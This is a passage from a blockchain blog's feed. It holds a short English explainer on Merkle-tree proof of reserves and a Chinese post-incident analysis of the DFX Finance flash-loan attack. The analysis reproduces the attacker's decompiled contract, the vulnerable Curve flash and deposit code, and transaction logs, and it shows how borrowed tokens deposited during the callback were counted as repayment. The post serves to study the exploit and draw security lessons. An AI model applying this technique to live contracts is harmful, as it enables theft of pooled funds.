    <content type="html"><![CDATA[<h1>what is Merkle Tree Proof of Reserves</h1><p>After FTX was hacked, many prevailing exchanges announced they would provide Merkle Tree Proof of Reserves to encourage transparency[<a href="https://www.thenewsminute.com/article/what-merkle-tree-proof-reserves-170062">1</a>]. The Merkle tree proof of reserve is an essential cryptographic tool that is thought to boost the public confidence and transparency of user assets. It utilizes a particular data structure, Hash Tree or Merkle tree, to prove that the centralized exchange has adequate assets to serve its customers.<img src="http://cdn.blog-blockchain.xyz/202211182038173.png" alt="1920px-Hash_Tree.svg" style="zoom: 50%;" /></p><p>The above picture from the wiki shows that every leaf node is the hash of a data block, and every non-leaf node is the hash of its child nodes. Hence, all the child nodes uniquely establish and determine the root. When applied to proof of reserves, the leaves are labeled as all the balances of accounts controlled by centralized exchanges. We can quickly validate and monitor whether the accumulated balance alters.</p><p>To enhance its confidence, exchanges may entrust third-party auditors to pick a snapshot at random and combine the unique hashed id into a Merkle tree, then consolidate all id information into a root. Users can input their hash pieces to reproduce the process partly to verify their balance by checking the root. An example can be seen at <a href="https://proof-of-reserves.trustexplorer.io/clients/kraken/">https://proof-of-reserves.trustexplorer.io/clients/kraken/</a> .</p><h1>Improved Approaches</h1><h2 id="Real-time-Attestation">Real-time Attestation</h2><p>Though the mentioned method seems perfect, many flaws must be addressed. For instance, an exchange company may borrow plenty of assets to counterfeit that they are solvent and affordable for any withdrawal before the snapshot. Real-time attestation can mitigate and alleviate the problem.</p><p>Real-time attestation, also named real-time assurance, is the process whereby an independent accountant collects sufficient audit evidence and performs substantive procedures to issue on-demand audit reporting to intended users while meeting obligations under the then-prevailing audit standards and professional ethics requirements[<a href="https://www.armaninollp.com/-/media/pdf/white-papers/whitepaper-trustexplorer-real-time-audit.pdf">2</a>]. It is noteworthy that “real-time” does not mean “continuously” but “collect audit evidence in real-time”. An example can be seen at <a href="https://real-time-attest.trustexplorer.io/nexo">https://real-time-attest.trustexplorer.io/nexo</a> .</p><p>Relevant tutorials or passages are rare. <a href="https://dgi.io/ots/">OpenTimestamps</a> is a blockchain-agnostic protocol that creates timestamp proofs based on a Certificate Authority (CA) issued by the governing body of a blockchain[<a href="https://medium.com/business-blockchain-hq/armanino-launches-auditing-software-business-blockchain-hq-e5f935dcc8a4">3</a>]. The OpenTimestamps protocol can reduce to the procedure that aggregates new node hash into Merkle Tree root when the monitored accounts change. This method does not consume much gas or computation since it operates outside the blockchain.</p><p>If you are interested in the protocol mentioned above, the <a href="https://dgi.io/ots-tutorial/">website</a>[4] might be a playground for you.</p><h2 id="MPC-Threshold-Signature-Scheme">MPC-Threshold Signature Scheme</h2><p>Multi-party computation is a subfield of cryptography with the goal of creating methods for parties to jointly compute a function over their inputs while keeping those inputs private[<a href="https://en.wikipedia.org/wiki/Secure_multi-party_computation">5</a>].</p><blockquote><p>There are three main properties of multi-party computation[<a href="https://www.jadewallet.io/mpc-based-threshold-signature-scheme.html">6</a>]:</p><ol><li>Correctness: the parties involved in multi-party computing initiate computation tasks and perform collaborative computation through an agreed secure multi-party computation function. The output produced by and algorithm is correct ( as expected).</li><li>Privacy: each party must ensure that their secret inputs are independent and that no local data is disclosed during the computation.</li><li>Decentralization: a decentralized computing model is offered with total equal of each participant, and no privilege for any participant or third party.</li></ol></blockquote><p>MPC-Threshold Signature Scheme divides a key-share to the auditor, who can use it to get anonymous information about total assets controlled by the centralized exchange. However, the auditor can not use it to obtain other sensitive information. Particularly, the entrusted auditor must get another key-share conferred from the exchange to get the privilege of censoring its assets. For instance, only an authorized can aggregate the total assets of all co-managed addresses by both the exchange and the auditor.</p><h1>Further Reading</h1><ul><li><a href="https://blockworks.co/news/what-are-proof-of-reserves-and-can-they-build-back-trust">What Is Proof of Reserves and Can It Build Back Trust? - Blockworks</a></li><li><a href="https://en.wikipedia.org/wiki/Secret_sharing">Secret sharing</a> - From Wikipedia, the free encyclopedia</li><li>Chatzigiannis, P., Chalkias, K. (2021). Proof of Assets in the Diem Blockchain. In: , <em>et al.</em> Applied Cryptography and Network Security Workshops. ACNS 2021. Lecture Notes in Computer Science(), vol 12809. Springer, Cham. <a href="https://doi.org/10.1007/978-3-030-81645-2_3">https://doi.org/10.1007/978-3-030-81645-2_3</a></li><li>Decker, C., Guthrie, J., Seidel, J., Wattenhofer, R. (2015). Making Bitcoin Exchanges Transparent. In: Pernul, G., Y A Ryan, P., Weippl, E. (eds) Computer Security – ESORICS 2015. ESORICS 2015. Lecture Notes in Computer Science(), vol 9327. Springer, Cham. <a href="https://doi.org/10.1007/978-3-319-24177-7_28">https://doi.org/10.1007/978-3-319-24177-7_28</a></li><li>Reddy, B. Swaroopa. “A ZK-SNARK based Proof of Assets Protocol for Bitcoin Exchanges.” <em>arXiv preprint arXiv:2208.01263</em> (2022).</li></ul><h1>reference</h1><ul><li>[1] <a href="https://www.thenewsminute.com/article/what-merkle-tree-proof-reserves-170062">https://www.thenewsminute.com/article/what-merkle-tree-proof-reserves-170062</a></li><li>[2]<a href="https://www.armaninollp.com/-/media/pdf/white-papers/whitepaper-trustexplorer-real-time-audit.pdf">https://www.armaninollp.com/-/media/pdf/white-papers/whitepaper-trustexplorer-real-time-audit.pdf</a></li><li>[3]<a href="https://medium.com/business-blockchain-hq/armanino-launches-auditing-software-business-blockchain-hq-e5f935dcc8a4">https://medium.com/business-blockchain-hq/armanino-launches-auditing-software-business-blockchain-hq-e5f935dcc8a4</a></li><li>[4] <a href="https://dgi.io/ots-tutorial/">https://dgi.io/ots-tutorial/</a></li><li>[5]<a href="https://en.wikipedia.org/wiki/Secure_multi-party_computation">https://en.wikipedia.org/wiki/Secure_multi-party_computation</a></li><li>[6]<a href="https://www.jadewallet.io/mpc-based-threshold-signature-scheme.html">https://www.jadewallet.io/mpc-based-threshold-signature-scheme.html</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;what is Merkle Tree Proof of Reserves&lt;/h1&gt;
&lt;p&gt;After FTX was hacked, many prevailing exchanges announced they would provide Merkle Tree Proof of Reserves to encourage transparency[&lt;a href=&quot;https://www.thenewsminute.com/article/what-merkle-tree-proof-reserves-170062&quot;&gt;1&lt;/a&gt;]. The Merkle tree proof of reserve is an essential cryptographic tool that is thought to boost the public confidence and transparency of user assets. It utilizes a particular data structure, Hash Tree or Merkle tree, to prov</summary>
        
      
    
    
    
    <category term="defi" scheme="https://www.blog-blockchain.xyz/categories/defi/"/>
    
    
    <category term="defi" scheme="https://www.blog-blockchain.xyz/tags/defi/"/>
    
  </entry>
  
  <entry>
    <title>DFX Finance 攻击分析</title>
    <link href="https://www.blog-blockchain.xyz/defi/DFX-Finance-attack/"/>
    <id>https://www.blog-blockchain.xyz/defi/DFX-Finance-attack/</id>
    <published>2022-11-11T12:49:22.000Z</published>
    <updated>2024-11-15T14:30:54.920Z</updated>
    
    <content type="html"><![CDATA[<h1>信息</h1><p>攻击者地址：0x14c19962e4a899f29b3dd9ff52ebfb5e4cb9a067</p><p>分析的交易：0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7</p><p>发起攻击的合约：0x6cfa86a352339e766ff1ca119c8c40824f41f22d</p><p>函数调用参数：<a href="https://fefu.io/eth/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">https://fefu.io/eth/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7</a></p><p>tenderly: <a href="https://dashboard.tenderly.co/tx/mainnet/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7">https://dashboard.tenderly.co/tx/mainnet/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7</a></p><p>代码和分析打包：<a href="https://1drv.ms/u/s!At0_LwVPvookh6ApCW53C1CM9ixVIg?e=ewzgtq">https://1drv.ms/u/s!At0_LwVPvookh6ApCW53C1CM9ixVIg?e=ewzgtq</a></p><h1>发起攻击的合约逆向</h1><p>完整逆向代码见：<a href="https://gist.github.com/learnerLj/f6a1ce6e8a1b1fe98510cfbd2a98d3d1">https://gist.github.com/learnerLj/f6a1ce6e8a1b1fe98510cfbd2a98d3d1</a></p><p>首先攻击者调用攻击合约，逆向代码进行了简化，攻击者设置了一些 require，防止被 bot 抢跑，这里我们删除这些语句还有逆向代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function 0xb727281f(uint256 varg0, uint256 varg1) public payable &#123;</span><br><span class="line">    require(4 + (msg.data.length - 4) - 4 &gt;= 64);</span><br><span class="line">    require(msg.sender == 0x14c19962e4a899f29b3dd9ff52ebfb5e4cb9a067);</span><br><span class="line">    stor_5 = varg0;</span><br><span class="line">    stor_9 = varg1;</span><br><span class="line">    v0, v1 = stor_0_0_19.viewDeposit(stor_5).gas(msg.gas);</span><br><span class="line">    RETURNDATACOPY(v1, 0, RETURNDATASIZE());</span><br><span class="line">    MEM[64] = v1 + (RETURNDATASIZE() + 31 &amp; ~0x1f);</span><br><span class="line">    if (1 &lt; MEM[v1 + MEM[v1 + 32]]) &#123;</span><br><span class="line">        if (0 &lt; MEM[v1 + MEM[v1 + 32]]) &#123;</span><br><span class="line">            0x34d3();</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    revert(Panic(50));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code> v0, v1 = stor_0_0_19.viewDeposit(stor_5).gas(msg.gas);</code> 调用了如下函数，位于 <code>Curve/contracts/Curve.sol#550</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/// @notice view deposits and curves minted a given deposit would return</span><br><span class="line">/// @param _deposit the full amount of stablecoins you want to deposit. Divided evenly according to the</span><br><span class="line">///                 prevailing proportions of the numeraire assets of the pool</span><br><span class="line">/// @return (the amount of curves you receive in return for your deposit,</span><br><span class="line">///          the amount deposited for each numeraire)</span><br><span class="line">function viewDeposit(uint256 _deposit) external view transactable returns (uint256, uint256[] memory) &#123;</span><br><span class="line">    // curvesToMint_, depositsToMake_</span><br><span class="line">    return ProportionalLiquidity.viewProportionalDeposit(curve, _deposit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ProportionalLiquidity.viewProportionalDeposit</code> 是库合约中的函数，位于 <code>Curve/contracts/ProportionalLiquidity.sol#78</code>，第一个参数 <code>curve</code> 是一个结构体包括各种属性，第二个是计划存入的金额。具体内容不细致分析，读者感兴趣可以自行查看源码。这一段的作用是用于查看如果存入这么多金额，应该会返回多少代币。</p><p>之后经过很多检查后，攻击的合约执行如下函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function 0x34d3() private &#123;</span><br><span class="line">    v0 = 0x3774(stor_9, stor_7);</span><br><span class="line">    v1 = 0x37e1(1000, v0);</span><br><span class="line">    v2 = _SafeSub(v1, stor_7);</span><br><span class="line">    v3 = 0x3774(stor_9, _uniswapV3FlashCallback);</span><br><span class="line">    v4 = 0x37e1(1000, v3);</span><br><span class="line">    v5 = _SafeSub(v4, _uniswapV3FlashCallback);</span><br><span class="line">    require(stor_0_0_19.code.size);</span><br><span class="line">    v6 = stor_0_0_19.flash(address(this), v2, v5, &#x27;0xcallflash&#x27;).gas(msg.gas);</span><br><span class="line">    require(v6); // checks call status, propagates error data on error</span><br><span class="line">    require(stor_0_0_19.code.size);</span><br><span class="line">    v7, v8 = stor_0_0_19.balanceOf(address(this)).gas(msg.gas);</span><br><span class="line">    require(v7); // checks call status, propagates error data on error</span><br><span class="line">    MEM[64] = MEM[64] + (RETURNDATASIZE() + 31 &amp; ~0x1f);</span><br><span class="line">    require(MEM[64] + RETURNDATASIZE() - MEM[64] &gt;= 32);</span><br><span class="line">    0x43bd(v8);</span><br><span class="line">    require(stor_0_0_19.code.size);</span><br><span class="line">    v9 = stor_0_0_19.withdraw(v8, 0xf285c0bd068).gas(msg.gas);</span><br><span class="line">    require(v9); // checks call status, propagates error data on error</span><br><span class="line">    return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>0x3774</code> <code>0x37e1</code> 等函数是算术运算，不细看，直到开始调用 <code>v6 = stor_0_0_19.flash(address(this), v2, v5, '0xcallflash').gas(msg.gas);</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">function flash(</span><br><span class="line">    address recipient,</span><br><span class="line">    uint256 amount0,</span><br><span class="line">    uint256 amount1,</span><br><span class="line">    bytes calldata data</span><br><span class="line">) external transactable noDelegateCall isNotEmergency &#123;</span><br><span class="line">    uint256 fee = curve.epsilon.mulu(1e18);</span><br><span class="line"></span><br><span class="line">    require(IERC20(derivatives[0]).balanceOf(address(this)) &gt; 0, &#x27;Curve/token0-zero-liquidity-depth&#x27;);</span><br><span class="line">    require(IERC20(derivatives[1]).balanceOf(address(this)) &gt; 0, &#x27;Curve/token1-zero-liquidity-depth&#x27;);</span><br><span class="line"></span><br><span class="line">    uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e18);</span><br><span class="line">    uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e18);</span><br><span class="line">    uint256 balance0Before = IERC20(derivatives[0]).balanceOf(address(this));</span><br><span class="line">    uint256 balance1Before = IERC20(derivatives[1]).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">    if (amount0 &gt; 0) IERC20(derivatives[0]).safeTransfer(recipient, amount0);</span><br><span class="line">    if (amount1 &gt; 0) IERC20(derivatives[1]).safeTransfer(recipient, amount1);</span><br><span class="line"></span><br><span class="line">    IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);</span><br><span class="line"></span><br><span class="line">    uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));</span><br><span class="line">    uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">    require(balance0Before.add(fee0) &lt;= balance0After, &#x27;Curve/insufficient-token0-returned&#x27;);</span><br><span class="line">    require(balance1Before.add(fee1) &lt;= balance1After, &#x27;Curve/insufficient-token1-returned&#x27;);</span><br><span class="line"></span><br><span class="line">    // sub is safe because we know balanceAfter is gt balanceBefore by at least fee</span><br><span class="line">    uint256 paid0 = balance0After - balance0Before;</span><br><span class="line">    uint256 paid1 = balance1After - balance1Before;</span><br><span class="line"></span><br><span class="line">    IERC20(derivatives[0]).safeTransfer(owner, paid0);</span><br><span class="line">    IERC20(derivatives[1]).safeTransfer(owner, paid1);</span><br><span class="line"></span><br><span class="line">    emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是非常标准的闪电贷代码，关键是 <code>IFlashCallback(msg.sender).flashCallback(fee0, fee1, data);</code> 回调了。</p><p>回调的攻击者合约代码如下（也做了简化）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function 0xc3924ed6(uint256 varg0, uint256 varg1, uint256 varg2) public payable &#123;</span><br><span class="line">    v0 = stor_0_0_19.deposit(stor_5, 0xf285c0bd068).gas(msg.gas);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非常直接的开始存款，函数如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/// @notice deposit into the pool with no slippage from the numeraire assets the pool supports</span><br><span class="line">/// @param  _deposit the full amount you want to deposit into the pool which will be divided up evenly amongst</span><br><span class="line">///                  the numeraire assets of the pool</span><br><span class="line">/// @return (the amount of curves you receive in return for your deposit,</span><br><span class="line">///          the amount deposited for each numeraire)</span><br><span class="line">function deposit(uint256 _deposit, uint256 _deadline)</span><br><span class="line">    external</span><br><span class="line">    deadline(_deadline)</span><br><span class="line">    transactable</span><br><span class="line">    nonReentrant</span><br><span class="line">    noDelegateCall</span><br><span class="line">    notInWhitelistingStage</span><br><span class="line">    isNotEmergency</span><br><span class="line">    returns (uint256, uint256[] memory)</span><br><span class="line">&#123;</span><br><span class="line">    // (curvesMinted_,  deposits_)</span><br><span class="line">    return ProportionalLiquidity.proportionalDeposit(curve, _deposit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体参数 <code>deposit(uint256 200_000_000_000_000_000_000_000, 16_666_017_386_600)</code>。它直接调用了库函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">function proportionalDeposit(Storage.Curve storage curve, uint256 _deposit)</span><br><span class="line">        external</span><br><span class="line">        returns (uint256 curves_, uint256[] memory)</span><br><span class="line">    &#123;</span><br><span class="line">        int128 __deposit = _deposit.divu(1e18);</span><br><span class="line"></span><br><span class="line">        uint256 _length = curve.assets.length;</span><br><span class="line"></span><br><span class="line">        uint256[] memory deposits_ = new uint256[](_length);</span><br><span class="line"></span><br><span class="line">        (int128 _oGLiq, int128[] memory _oBals) = getGrossLiquidityAndBalancesForDeposit(curve);</span><br><span class="line"></span><br><span class="line">        // Needed to calculate liquidity invariant</span><br><span class="line">        // (int128 _oGLiqProp, int128[] memory _oBalsProp) = getGrossLiquidityAndBalances(curve);</span><br><span class="line"></span><br><span class="line">        // No liquidity, oracle sets the ratio</span><br><span class="line">        if (_oGLiq == 0) &#123;</span><br><span class="line">            for (uint256 i = 0; i &lt; _length; i++) &#123;</span><br><span class="line">                // Variable here to avoid stack-too-deep errors</span><br><span class="line">                int128 _d = __deposit.mul(curve.weights[i]);</span><br><span class="line">                deposits_[i] = Assimilators.intakeNumeraire(curve.assets[i].addr, _d.add(ONE_WEI));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // We already have an existing pool ratio</span><br><span class="line">            // which must be respected</span><br><span class="line">            int128 _multiplier = __deposit.div(_oGLiq);</span><br><span class="line"></span><br><span class="line">            uint256 _baseWeight = curve.weights[0].mulu(1e18);</span><br><span class="line">            uint256 _quoteWeight = curve.weights[1].mulu(1e18);</span><br><span class="line"></span><br><span class="line">            for (uint256 i = 0; i &lt; _length; i++) &#123;</span><br><span class="line">                deposits_[i] = Assimilators.intakeNumeraireLPRatio(</span><br><span class="line">                    curve.assets[i].addr,</span><br><span class="line">                    _baseWeight,</span><br><span class="line">                    _quoteWeight,</span><br><span class="line">                    _oBals[i].mul(_multiplier).add(ONE_WEI)</span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int128 _totalShells = curve.totalSupply.divu(1e18);</span><br><span class="line"></span><br><span class="line">        int128 _newShells = __deposit;</span><br><span class="line"></span><br><span class="line">        if (_totalShells &gt; 0) &#123;</span><br><span class="line">            _newShells = __deposit.mul(_totalShells);</span><br><span class="line">            _newShells = _newShells.div(_oGLiq);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mint(curve, msg.sender, curves_ = _newShells.mulu(1e18));</span><br><span class="line"></span><br><span class="line">        return (curves_, deposits_);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>getGrossLiquidityAndBalancesForDeposit(curve)</code> 计算之前存款的总流动性和余额，然后在 <code>Assimilators.intakeNumeraireLPRatio</code> 计算了存入金额和 LP 的比率，然后攻击者合约给 curve 合约打钱。下面是两个日志</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;from&quot;:&quot;0x6cfa86a352339e766ff1ca119c8c40824f41f22d&quot;</span><br><span class="line">&quot;to&quot;:&quot;0x46161158b1947d9149e066d6d31af1283b2d377c&quot;</span><br><span class="line">&quot;value&quot;:&quot;2325581395325581&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;from&quot;:&quot;0x6cfa86a352339e766ff1ca119c8c40824f41f22d&quot;</span><br><span class="line">&quot;to&quot;:&quot;0x46161158b1947d9149e066d6d31af1283b2d377c&quot;</span><br><span class="line">&quot;value&quot;:&quot;100000000000&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后 mint 代币给攻击者合约。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;from&quot;:&quot;0x0000000000000000000000000000000000000000&quot;</span><br><span class="line">&quot;to&quot;:&quot;0x6cfa86a352339e766ff1ca119c8c40824f41f22d&quot;</span><br><span class="line">&quot;value&quot;:&quot;387023837944937266146579&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 flash 回调结束的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">balance0Before = 0x000000000000000000000000000000000000000000000000002463e31a1c492c</span><br><span class="line">balance1Before = 0x00000000000000000000000000000000000000000000000000000068516c41ac</span><br><span class="line"></span><br><span class="line">balance0After = 0x00000000000000000000000000000000000000000000000000247093e6d40a1d</span><br><span class="line">balance1After = 0x00000000000000000000000000000000000000000000000000000068752f87ac</span><br><span class="line"></span><br><span class="line">paid0 = 0xcb0ccb7c0f1</span><br><span class="line">paid1 = 0x23c34600</span><br></pre></td></tr></table></figure><p>说明还需要支付的代币已经少了很多了，因为最开始借贷的代币数量是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;from&quot;:&quot;0x46161158b1947d9149e066d6d31af1283b2d377c&quot;</span><br><span class="line">&quot;to&quot;:&quot;0x6cfa86a352339e766ff1ca119c8c40824f41f22d&quot;</span><br><span class="line">&quot;value&quot;:&quot;0x83669d03f319c&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;from&quot;:&quot;0x46161158b1947d9149e066d6d31af1283b2d377c&quot;</span><br><span class="line">&quot;to&quot;:&quot;0x6cfa86a352339e766ff1ca119c8c40824f41f22d&quot;</span><br><span class="line">&quot;value&quot;:&quot;0x1724b3a200&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明攻击者空手套白狼了两种代币，分别为 <code>0x829b9038770ab</code> <code>0x1700f05c00</code>，需要还闪电贷的只是一个零头。通过多次这样的交易，攻击者大量套利。</p><p>感觉这个逻辑还是简单的，可能一个合约中不能出现重入比较好，或者说是业务逻辑考虑不周全，没有考虑其他函数造成的 balance 改变对 flash 的影响。一般考虑清楚每个 callback，考虑清楚每个函数依赖的变量是否可能在调用过程中篡改，就能避免很多问题。这里稍微复杂以下的是，获取 balance 的过程基本都是用到了代理合约还有计算汇率是采用了自己 abi 编码其他合约去处理，导致中间一大堆调用，跳过就好。</p><p><strong>攻击的核心是在 curve 闪电贷的回调函数里，攻击者将借贷的代币存入 curve 合约，因为 curve 通过 balance(curve) 获取余额，所以存入的代币也被视作还款了。</strong></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1&gt;信息&lt;/h1&gt;
&lt;p&gt;攻击者地址：0x14c19962e4a899f29b3dd9ff52ebfb5e4cb9a067&lt;/p&gt;
&lt;p&gt;分析的交易：0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7&lt;/p&gt;
&lt;p&gt;发起攻击的合约：0x6cfa86a352339e766ff1ca119c8c40824f41f22d&lt;/p&gt;
&lt;p&gt;函数调用参数：&lt;a href=&quot;https://fefu.io/eth/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7&quot;&gt;https://fefu.io/eth/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;tenderly: &lt;a href=&quot;https://dashboard.tenderly.co/tx/mainnet/0x6bfd9e286e37061ed279e</summary>
        
      
    
    
    
    <category term="defi" scheme="https://www.blog-blockchain.xyz/categories/defi/"/>
    
    
    <category term="defi" scheme="https://www.blog-blockchain.xyz/tags/defi/"/>
    
  </entry>
  
  <entry>
    <title>（五）过程间分析</title>
    <link href="https://www.blog-blockchain.xyz/pl/Interprocedural-DFA/"/>
    <id>https://www.blog-blockchain.xyz/pl/Interprocedural-DFA/</id>
    <published>2022-10-23T14:00:33.000Z</published>
    <updated>2024-11-15T14:30:54.926Z</updated>
    
